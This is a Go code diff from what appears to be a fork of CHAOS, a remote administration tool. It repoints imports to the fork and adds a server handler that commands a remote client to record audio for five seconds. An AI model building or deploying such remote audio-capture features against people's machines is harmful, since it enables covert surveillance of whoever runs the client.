@@ -5,23 +5,24 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
-	"github.com/gin-gonic/gin"
-	"github.com/gin-gonic/gin/binding"
-	"github.com/sirupsen/logrus"
-	"github.com/tiagorlampert/CHAOS/entities"
-	"github.com/tiagorlampert/CHAOS/internal/utils"
-	"github.com/tiagorlampert/CHAOS/internal/utils/constants"
-	"github.com/tiagorlampert/CHAOS/internal/utils/network"
-	"github.com/tiagorlampert/CHAOS/internal/utils/system"
-	"github.com/tiagorlampert/CHAOS/presentation/http/request"
-	"github.com/tiagorlampert/CHAOS/services/client"
-	"github.com/tiagorlampert/CHAOS/services/payload"
-	"github.com/tiagorlampert/CHAOS/services/user"
 	"net/http"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/gin-gonic/gin"
+	"github.com/gin-gonic/gin/binding"
+	"github.com/justadoll/CHAOS/entities"
+	"github.com/justadoll/CHAOS/internal/utils"
+	"github.com/justadoll/CHAOS/internal/utils/constants"
+	"github.com/justadoll/CHAOS/internal/utils/network"
+	"github.com/justadoll/CHAOS/internal/utils/system"
+	"github.com/justadoll/CHAOS/presentation/http/request"
+	"github.com/justadoll/CHAOS/services/client"
+	"github.com/justadoll/CHAOS/services/payload"
+	"github.com/justadoll/CHAOS/services/user"
+	"github.com/sirupsen/logrus"
 )
 
 func (h *httpController) noRouteHandler(c *gin.Context) {
@@ -329,6 +330,18 @@ func (h *httpController) openUrlHandler(c *gin.Context) {
 		c.String(http.StatusInternalServerError, err.Error())
 		return
 	}
+	c.Status(http.StatusOK)
+	return
+}
+
+func (h *httpController) recordAudioHandler(c *gin.Context) {
+	var req request.StartRecordRequestForm
+	if err := c.ShouldBindWith(&req, binding.Form); err != nil {
+		c.String(http.StatusBadRequest, err.Error())
+		return
+	}
+	fmt.Println("[Server] Go command to record audio!")
+	h.AudioService.Record(c.Request.Context(), req.Address, "5s")
 	c.Status(http.StatusOK)
 	return
 }
